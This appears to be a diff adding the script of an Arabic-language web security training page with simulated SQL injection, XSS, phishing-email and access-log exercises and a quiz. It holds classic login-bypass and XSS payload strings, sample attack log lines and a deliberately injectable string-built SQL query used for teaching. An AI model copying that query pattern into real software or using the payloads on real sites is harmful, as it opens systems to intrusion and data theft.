+  {ip:'185.220.101.42',time:'14:20:23',method:'GET',path:'/config.php.bak',code:404,size:0,type:'scan'},
+  {ip:'10.0.0.5',time:'14:20:30',method:'POST',path:'/upload.php',code:200,size:1280542,type:'normal'},
+  {ip:'185.220.101.42',time:'14:20:45',method:'POST',path:'/login.php',code:200,size:892,type:'sql'},
+  {ip:'185.220.101.42',time:'14:21:00',method:'GET',path:"/search?q=<script>alert(1)</script>",code:200,size:1200,type:'xss'},
+];
+
+function getLogLine(e){
+  let color='#aab8c8';
+  if(e.type==='sql')color='#ff6644';
+  else if(e.type==='scan')color='#ffaa00';
+  else if(e.type==='xss')color='#ff4444';
+  else if(e.code>=400)color='#ff8888';
+  return `<span style="color:${color}">${e.ip} - [${e.time}] "${e.method} ${e.path} HTTP/1.1" ${e.code} ${e.size}</span>`;
+}
+
+function filterLog(type){
+  let entries=logData;
+  if(type==='404')entries=logData.filter(e=>e.code===404);
+  else if(type==='sql')entries=logData.filter(e=>e.type==='sql');
+  else if(type==='scan')entries=logData.filter(e=>e.type==='scan');
+  document.getElementById('log-content').innerHTML=entries.map(getLogLine).join('\n');
+  buildStats(entries);
+}
+
+function buildStats(entries){
+  const ipCount={};
+  entries.forEach(e=>{ipCount[e.ip]=(ipCount[e.ip]||0)+1});
+  let html='<div style="font-family:monospace;font-size:.82rem">';
+  Object.entries(ipCount).sort((a,b)=>b[1]-a[1]).forEach(([ip,count])=>{
+    const w=Math.min(count/logData.length*100*3,100);
+    const isSusp=ip==='185.220.101.42';
+    html+=`<div style="display:flex;align-items:center;gap:10px;margin:4px 0">
+      <span style="min-width:130px;color:${isSusp?'#ff4444':'#7ab3d4'}">${ip}</span>
+      <div style="background:#1e3a5c;border-radius:4px;height:16px;flex:1">
+        <div style="background:${isSusp?'#ff4444':'#7ab3d4'};width:${w}%;height:100%;border-radius:4px"></div>
+      </div>
+      <span style="color:#aab8c8">${count} طلب</span>
+      ${isSusp?'<span class="badge badge-red">⚠️ مشبوه</span>':''}
+    </div>`;
+  });
+  html+='</div>';
+  document.getElementById('stats-display').innerHTML=html;
+}
+
+function buildTimeline(){
+  const susp=logData.filter(e=>e.ip==='185.220.101.42');
+  let html='<div style="font-size:.85rem"><div style="color:#f59e0b;margin-bottom:10px;font-weight:bold">🕒 Timeline للـ IP المشبوه: 185.220.101.42</div>';
+  susp.forEach(e=>{
+    const icons={'sql':'💉','scan':'🔍','xss':'📜','normal':'📄'};
+    html+=`<div style="display:flex;gap:12px;align-items:flex-start;padding:6px 0;border-bottom:1px solid #1e3a5c">
+      <span style="color:#7ab3d4;font-family:monospace;min-width:70px">${e.time}</span>
+      <span style="min-width:20px">${icons[e.type]||'📄'}</span>
+      <span style="color:#aab8c8">${e.method} ${e.path}</span>
+      <span style="color:${e.code===200?'#ff4444':'#ffaa00'}">${e.code}</span>
+    </div>`;
+  });
+  html+='</div>';
+  document.getElementById('timeline-result').innerHTML=html;
+}
+
+// SQL Injection
+function injectSQL(user,pass){
+  document.getElementById('sqli-user').value=user;
+  document.getElementById('sqli-pass').value=pass;
+  runSQLi();
+}
+
+function runSQLi(){
+  const u=document.getElementById('sqli-user').value;
+  const p=document.getElementById('sqli-pass').value;
+  const query=`SELECT * FROM users WHERE username = '${u}' AND password = '${p}'`;
+  document.getElementById('sqli-query').innerHTML=`<span style="color:#7ab3d4">الاستعلام المنفَّذ:</span>\n<span style="color:#f59e0b">${query.replace(/</g,'&lt;')}</span>`;
+  const res=document.getElementById('sqli-result');
+  if(u==="admin'--"||p.includes("' OR '1'='1")||p.includes("OR 1=1")){
+    res.innerHTML=`<div class="alert alert-danger">🚨 تم تجاوز تسجيل الدخول! المهاجم دخل بصلاحية admin دون معرفة كلمة المرور.<br>الحقن غيّر منطق الاستعلام ليعود بنتائج دائماً.</div>`;
+  } else if(u==='admin'&&p==='Admin@2024!'){
+    res.innerHTML=`<div class="alert alert-success">✅ تسجيل دخول صحيح — بيانات حقيقية.</div>`;
+  } else {
+    res.innerHTML=`<div class="alert alert-warn">❌ بيانات خاطئة — تسجيل الدخول فشل.</div>`;
+  }
+}
+
+function runUnion(){
+  const html=`<div class="alert alert-danger">💥 UNION Attack نجح! البيانات المسرَّبة:</div>
+  <table class="db-table"><tr><th>name (المنتج)</th><th>price (كلمة المرور المسرَّبة)</th></tr>
+  <tr class="highlight"><td>admin</td><td>Admin@2024!</td></tr>
+  <tr class="highlight"><td>khalid</td><td>kh@lid123</td></tr>
+  <tr class="highlight"><td>sara</td><td>sara_pass</td></tr>
+  <tr class="highlight"><td>forensics</td><td>f0r3ns1cs!</td></tr></table>`;
+  document.getElementById('union-result').innerHTML=html;
+}
+
+// XSS
+function setXSS(val){
+  document.getElementById('xss-input').value=val;
+  previewXSS();
+}
+
+function previewXSS(){
+  const val=document.getElementById('xss-input').value;
+  const urlParam=encodeURIComponent(val);
+  document.getElementById('xss-url-param').textContent=urlParam.substring(0,50);
+  document.getElementById('xss-display').textContent=val;
+  const out=document.getElementById('xss-output');
+  const safe=document.getElementById('xss-safe-output');
+  if(val.toLowerCase().includes('<script')||val.toLowerCase().includes('onerror')||val.toLowerCase().includes('onload')){
+    out.innerHTML=`<div style="background:#ff000020;border:2px solid #ff4444;padding:10px;border-radius:6px;color:#ff4444">⚠️ في موقع حقيقي هنا كان سيُنفَّذ: <code>${val.replace(/</g,'&lt;')}</code><br>المهاجم يستطيع سرقة كل الـ Cookies أو إعادة التوجيه!</div>`;
+    safe.innerHTML=`<div class="alert alert-success">🛡️ النسخة الآمنة (بعد htmlspecialchars): يظهر النص <code>${val.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}</code> كنص عادي</div>`;
+  } else {
+    out.innerHTML=`<div style="color:#333">نتيجة البحث عن: <strong>${val}</strong></div>`;
+    safe.innerHTML='';
+  }
+}
+
+// Email
+function analyzeEmail(){
+  const html=`<div class="alert alert-danger" style="margin-top:12px">
+    <strong>🔍 نتائج التحليل الجنائي:</strong><br>
+    ❌ <strong>SPF: FAIL</strong> — المرسل ليس من خوادم Gmail المعتمدة<br>
+    ❌ <strong>DKIM: FAIL</strong> — التوقيع الرقمي غير متطابق، الرسالة مزوّرة أو معدَّلة<br>
+    ⚠️ <strong>Reply-To مختلف</strong> — أي رد يذهب لعنوان آخر (تصيّد احتيالي)<br>
+    🧅 <strong>Tor Exit Node</strong> — المرسل الحقيقي أخفى هويته بشبكة Tor<br>
+    🚨 <strong>الحكم: إيميل تصيّد احتيالي (Phishing) — يجب حجبه وإبلاغ الجهات المختصة</strong>
+  </div>`;
+  document.getElementById('email-analysis').innerHTML=html;
+}
+
+// Quiz
+const answered={};
+function checkQ(qId,correct,resId,pts){
+  if(answered[qId])return;
+  const sel=document.querySelector(`input[name="${qId}"]:checked`);
+  if(!sel){alert('اختر إجابة أولاً!');return}
+  answered[qId]=true;
+  document.querySelectorAll(`#${qId} label`).forEach(l=>{
+    const v=l.querySelector('input').value;
+    if(v===correct)l.classList.add('correct');
+    else if(l.querySelector('input').checked)l.classList.add('wrong');
+  });
+  document.getElementById(resId).innerHTML=sel.value===correct
+    ?`<div class="alert alert-success">✅ إجابة صحيحة! +${pts} نقطة</div>`
+    :`<div class="alert alert-warn">❌ إجابة خاطئة — راجع الشرح.</div>`;
+}
+
+function showTab(id){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  const tabs=['sqli','xss','session','email','logs'];
+  document.querySelectorAll('.tab')[tabs.indexOf(id)].classList.add('active');
+}
+
+window.addEventListener('load',()=>{
+  filterLog('all');
+  computeXOR_sym();
+});
+
+function computeXOR_sym(){}
+</script>
+</body>
+</html>
